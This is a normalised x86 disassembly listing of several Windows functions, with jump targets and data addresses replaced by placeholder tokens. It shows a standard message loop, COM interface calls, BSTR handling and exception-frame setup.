[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8c ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
push 0x0
lea ebx [ edi + 0x40 ]
call sub_420ed0
mov edx edi
call sub_422d50
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
add eax 0x4
add edi 0x74
call sub_401760
mov ecx [ edi + 0x28 ]
mov [ ecx ] 0x1
mov edx [ edi + 0x84 ]
mov eax [ edi + 0x28 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov edi ecx
mov edi [ ebp + 0x8 ]
mov edx ecx
mov ecx [ edx + 0x84 ]
mov edx [ eax + 0x8 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
lea edx [ eax + eax * 4 ]
mov eax [ edi + 0xa8 ]
add edx edx
mov eax [ eax + edx * 8 + 0x48 ]
cmp eax ebx
je r-xdata
cmp eax ecx
jge r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ edi + 0x84 ]
mov [ ecx + 0x4 ] eax
sub_422c10
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebx + 0x44 ] 0x0
push esi
push edi
mov edi eax
jne r-xdata
mov esi [ ebx + 0x38 ]
mov [ ebp - 0x4 ] 0x0
call sub_43d2d0
test al al
je r-xdata
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x0
call edx
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push esi
push ebx
mov ecx eax
call sub_422e40
test eax eax
js r-xdata
lea ecx [ ebx + 0x40 ]
call sub_420d20
test eax eax
mov eax 0x1
jne r-xdata
lea eax [ edi + 0x8 ]
lea edi [ ebx + 0x78 ]
call sub_401760
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_422c90
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ PeekMessageW@IAT ]
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ DispatchMessageW@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
lea ecx [ ecx ]
lea ecx [ ebp - 0x1c ]
push ecx
call edi
lea edx [ ebp - 0x1c ]
push edx
call ebx
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop ebx
sub_422d00
mov eax [ edi + 0x50 ]
sub eax [ edi + 0x4c ]
xor ecx ecx
sar eax 0x2
test eax eax
jle r-xdata
retn
mov edx [ edi + 0x4c ]
push esi
inc ecx
add edx 0x4
cmp ecx eax
jl r-xdata
cmp [ esi + 0xc ] 0x5
je r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax + 0xc ]
push 0x0
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x34 ]
mov ecx esi
call edx
cmp [ edi + 0x44 ] 0x0
je r-xdata
mov ecx [ edi + 0x44 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
pop esi
jmp edx
sub_422d50
mov eax [ edx + 0x50 ]
sub eax [ edx + 0x4c ]
xor ecx ecx
sar eax 0x2
test eax eax
jle r-xdata
retn
mov edx [ edx + 0x4c ]
push esi
inc ecx
add edx 0x4
cmp ecx eax
jl r-xdata
cmp [ esi + 0xc ] 0x5
je r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax + 0xc ]
push 0x0
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x34 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x38 ]
push 0x1
mov ecx esi
call edx
mov ecx [ esi + 0x15c ]
mov eax [ ecx ]
mov edx [ eax + 0x38 ]
push 0x1
call edx
pop esi
sub_422db0
push esi
mov esi eax
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x50 ]
sub eax [ esi + 0x4c ]
xor edx edx
sar eax 0x2
test eax eax
jle r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ esi + 0x30 ] 0x0
xor eax eax
mov esi [ esi + 0x4c ]
lea ebx [ ebx ]
pop esi
retn
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ esi + 0x1a0 ] 0x0
inc edx
add esi 0x4
cmp edx eax
jl r-xdata
cmp [ ecx + 0xc ] 0x5
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push ecx
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax + 0x15c ]
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx [ esi + 0x1a0 ]
test ecx ecx
je r-xdata
sub_422e40
push ebp
mov ebp esp
push 0xffffffff
push sub_44bb32
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
test edi edi
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov [ ebp - 0x18 ] esi
test esi esi
jne r-xdata
xor esi esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x3
mov ecx [ edi ]
mov eax [ ecx + 0x94 ]
lea edx [ ebp - 0x10 ]
push edx
push esi
push edi
call eax
mov edi eax
mov [ ebp - 0x4 ] 0x2
push esi
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
push 0x8007000e
call sub_402d00
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push 0x0
push eax
call sub_422f60
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_422f60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44badc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x90 ]
call eax
mov edi eax
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x28 ]
mov [ esp + 0x28 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov [ esp + 0x24 ] ebx
cmp [ esp + 0x28 ] ebx
jle r-xdata
mov eax edi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x38 ] 0x3
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x28 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp [ esp + 0x14 ] ebx
je r-xdata
mov [ esp + 0x38 ] 0x1
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x10 ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx edi
call sub_402a00
mov [ esp + 0x38 ] 0x4
mov [ esp + 0x1c ] ebx
mov [ esp + 0x38 ] 0x5
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0x1c ]
lea ecx [ esp + 0x1c ]
push ecx
push eax
call edx
test eax eax
js r-xdata
mov eax [ esp + 0x24 ]
inc eax
mov [ esp + 0x24 ] eax
cmp eax [ esp + 0x28 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp + 0x14 ]
mov edx [ esp + 0x20 ]
mov eax [ ebp + 0xc ]
mov ebx [ esp + 0x14 ]
push ecx
push edx
push eax
mov ecx esi
call sub_423100
mov edi eax
mov [ esp + 0x38 ] 0x4
mov ecx [ esp + 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov [ esp + 0x38 ] 0x3
mov eax [ esp + 0x20 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ esp + 0x1c ]
push eax
push edi
push r--data
lea edi [ esp + 0x2c ]
call sub_401dc0
add esp 0xc
xor ebx ebx
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_423100
push ebp
mov ebp esp
push 0xffffffff
push sub_44ba68
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor eax eax
cmp ebx eax
jne r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
call edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_43d3d0
mov esi eax
test esi esi
jne r-xdata
mov eax 0x80004005
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x7c ] 0x0
je r-xdata
mov ecx [ edi + 0x44 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x84 ]
cmp [ edx ] 0x0
mov [ ebp - 0x14 ] 0x0
push r--data
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
push eax
call [ SysFreeString@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ ecx ]
mov eax [ ebp - 0x14 ]
mov edx [ edx + 0x20 ]
push eax
call edx
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
push ecx
call [ SysFreeString@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ edi + 0x80 ] 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push 0x0
push esi
push ecx
push edx
push ebx
push eax
call sub_4232c0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
push eax
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
push eax
push ebx
mov ecx edi
call sub_422f60
mov [ ebp - 0x14 ] eax
mov [ edi + 0x80 ] 0x0
sub_423290
xor eax eax
xor edx edx
xor ecx ecx
lea eax [ edx + edx * 2 ]
lea eax [ eax * 8 + rw-data ]
retn
add ecx 0x18
inc edx
cmp ecx 0x258
jb r-xdata
cmp [ ecx + rw-data ] esi
je r-xdata
retn
sub_4232c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44ba3a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x18 ]
mov eax [ ecx + 0xc ]
mov [ ebp - 0x18 ] eax
cmp eax 0x7
jne r-xdata
cmp eax 0x8
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx 0x6
cmp [ eax + 0xc ] ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
mov edx [ ebp + 0x10 ]
mov ecx 0x6
cmp [ edx + 0xc ] ecx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
call sub_421780
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edi
mov edx eax
mov [ edi + 0xb4 ] eax
call sub_425090
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp + 0xc ]
mov edx [ ebx ]
mov ecx [ edx + 0x44 ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
call ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
test esi esi
je r-xdata
call sub_421780
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edi
mov edx eax
mov [ edi + 0xb8 ] eax
call sub_425090
jmp r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp + 0x1c ] eax
push ebx
call sub_428610
mov [ ebp + 0x1c ] eax
test eax eax
jne r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
push edx
lea eax [ edi + 0x40 ]
push ecx
push eax
mov eax [ ebp + 0x1c ]
lea ebx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x0
call sub_420f60
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push eax
push ebx
push edi
lea eax [ ebp - 0x1c ]
call sub_423600
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
push ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ebp - 0x14 ]
push edx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
call sub_40a500
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + 0x4 ]
mov esi [ ebp + 0x18 ]
mov [ ebx + 0x14 ] eax
mov al [ edi + 0x90 ]
mov [ ebx + 0x69 ] al
mov edx [ edi + 0x84 ]
cmp [ edx + 0x8 ] 0x0
mov edx [ ebp - 0x10 ]
setne al
mov [ edx + 0xaa ] al
cmp [ esi + 0x15 ] 0x0
mov [ ebp + 0x8 ] 0x0
je r-xdata
mov esi [ esi + 0x18 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
push edi
call sub_43b6a0
mov esi [ ebp - 0x18 ]
call sub_423290
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
call sub_423290
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx eax
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov esi [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x14 ]
push ebx
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push esi
lea ecx [ eax + edi ]
call edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp - 0x10 ]
push edx
mov edx [ ebp - 0x14 ]
push ebx
push edx
mov edx [ ebp + 0xc ]
mov ecx eax
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
push edx
add ecx edi
call eax
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
push ebx
lea ecx [ edi + 0x40 ]
call sub_420d70
mov eax [ ebp + 0x14 ]
mov ecx [ edi + 0x44 ]
mov edx [ ecx ]
mov edx [ edx + 0x24 ]
push edi
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x18 ]
push esi
push eax
call edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x1c ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx ]
mov eax [ ebp - 0x10 ]
mov edx [ edx + 0x4 ]
push esi
push eax
mov ecx ebx
call edx
mov eax [ edi + 0x80 ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
push esi
mov ecx ebx
call edx
mov eax [ ebp + 0x18 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x18 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push 0x0
push ecx
push esi
lea ecx [ eax + edi ]
call edx
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x14 ]
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push 0x0
push ecx
push esi
lea ecx [ eax + edi ]
call edx
sub_423600
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov [ ebx ] 0x0
test esi esi
je r-xdata
pop edi
mov al 0x1
pop ebx
pop ebp
retn 0x10
mov eax [ esi ]
mov edx [ eax + 0x58 ]
mov ecx esi
call edx
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x4c ]
push ecx
mov ecx edi
call edx
test eax eax
jne r-xdata
mov [ ebx ] 0x1
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x7c ] al
je r-xdata
mov edx [ edi ]
mov eax [ ebp + 0x10 ]
mov edx [ edx + 0x4 ]
push eax
mov ecx edi
call edx
test al al
jne r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ ebx + 0x44 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
push esi
push edx
mov edx [ ebp + 0x14 ]
push edx
call eax
test eax eax
jne r-xdata
xor al al
pop edi
pop ebx
pop ebp
retn 0x10
cmp [ ebx + 0x7c ] al
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_43b340
test al al
jne r-xdata
sub_423690
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44be44
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0xc ]
mov ebx ecx
mov ecx [ ebp + 0x1c ]
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] ecx
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x38 ] 0x1
mov edx [ eax ]
mov edx [ edx + 0x94 ]
lea ecx [ esp + 0x14 ]
push ecx
push r--data
push eax
call edx
cmp [ esp + 0x14 ] 0x0
jne r-xdata
push 0x0
push r--data
push r--data
push esi
call sub_428790
mov ecx [ ebx + 0x84 ]
push 0x0
mov [ ecx ] al
mov edx [ ebx + 0x84 ]
mov al [ edx ]
push r--data
push r--data
push esi
mov [ edi + 0x184 ] al
call sub_428790
mov edx [ ebx + 0x84 ]
test al al
sete cl
mov [ edx + 0x2 ] cl
mov eax [ ebx + 0x84 ]
movzx ecx [ eax + 0x2 ]
push 0x0
push r--data
push r--data
push esi
mov [ edi + 0x194 ] cl
call sub_428790
mov edx [ ebx + 0x84 ]
mov [ edx + 0x3 ] al
mov eax [ ebx + 0x84 ]
movzx ecx [ eax + 0x3 ]
push 0x0
push r--data
push r--data
push esi
mov [ edi + 0x195 ] cl
call sub_428790
xor edx edx
test al al
mov eax [ ebx + 0x84 ]
sete dl
mov [ eax + 0xc ] edx
cmp [ ebx + 0x8c ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x18 ] eax
mov [ esp + 0x38 ] 0x4
mov ecx [ ebx + 0x84 ]
push r--data
push esi
lea edi [ esp + 0x20 ]
mov [ ecx + 0x8 ] 0x1
call sub_428960
test eax eax
js r-xdata
mov ecx [ ebx + 0x84 ]
mov edx [ ebx + 0x28 ]
mov eax [ ecx + 0xc ]
mov [ edx + 0x4 ] eax
mov [ esp + 0x38 ] 0xffffffff
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x84 ]
cmp [ ecx + 0x8 ] 0x0
mov edi [ esp + 0x20 ]
setne dl
mov [ edi + 0xaa ] dl
call [ Ordinal_crt_10@IAT ]
test al al
je r-xdata
mov edx [ esp + 0x18 ]
push r--data
push edx
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ esp + 0x24 ]
mov ecx [ ebp + 0x14 ]
mov edx [ esp + 0x14 ]
push esi
push ecx
push ebx
mov ecx edi
call sub_43c5d0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] 0x6
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0x94 ]
lea ecx [ esp + 0x1c ]
push ecx
push r--data
push eax
call edx
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x0
push r--data
push r--data
push esi
call sub_428790
mov ecx [ ebx + 0x84 ]
mov [ ecx + 0x1 ] al
mov edx [ ebx + 0x84 ]
mov al [ edx + 0x1 ]
mov [ ebx + 0x2c ] al
mov eax [ ebx + 0x84 ]
mov [ eax + 0x8 ] 0x0
add edi 0xc
mov esi edi
call sub_4028b0
mov esi [ esp + 0x28 ]
push r--data
push esi
call sub_428960
test eax eax
jns r-xdata
push edi
push eax
mov ecx esi
mov edx ebx
call sub_43c710
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push r--data
push esi
call sub_428960
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ esp + 0x20 ]
push eax
push ebx
call sub_423980
mov [ esp + 0x38 ] 0x4
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov [ ebx + 0xb0 ] 0x0
cmp [ ebx + 0xb0 ] eax
jl r-xdata
mov [ esp + 0x38 ] 0x1
mov eax [ esp + 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_423980
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xa4 ]
lea ecx [ edi + 0x94 ]
test eax eax
je r-xdata
mov al 0x1
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ eax ] 0x0
jne r-xdata
mov edx [ edi + 0xb0 ]
lea eax [ ebp - 0x4 ]
push eax
push edx
mov [ ebp - 0x4 ] 0x0
call sub_43a9d0
test al al
je r-xdata
xor al al
pop edi
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx [ ebp - 0x4 ]
push esi
add edi 0x14
push edi
mov ecx ebx
call sub_43add0
mov esi eax
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x0
push ebx
mov ecx esi
call edx
mov ebx 0x1
add [ esi + 0x4 ] ebx
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
dec [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x30 ] esi
add [ esi + 0x4 ] ebx
mov [ ecx + 0x1a0 ] esi
pop esi
mov al bl
pop ebx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ edi + 0x1c ] 0x0
pop esi
pop ebx
xor al al
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
sub_423a40
push ebp
mov ebp esp
push 0xffffffff
push sub_44bdce
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x10 ]
push r--data
push esi
lea edi [ ebp - 0x14 ]
call sub_428960
mov edi [ ebp - 0x14 ]
mov eax [ edi - 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x38 ]
cmp [ eax + 0x8 ] 0x0
mov [ ebp + 0x10 ] eax
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
mov edx [ ebp + 0x1c ]
mov ecx esi
call sub_423c50
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jmp r-xdata
xor esi esi
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
push 0x2
call eax
mov esi eax
jmp r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x6
push edi
call [ SysAllocString@IAT ]
mov edi eax
mov [ ebp + 0x1c ] edi
test edi edi
jne r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
mov [ ebp + 0xc ] esi
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
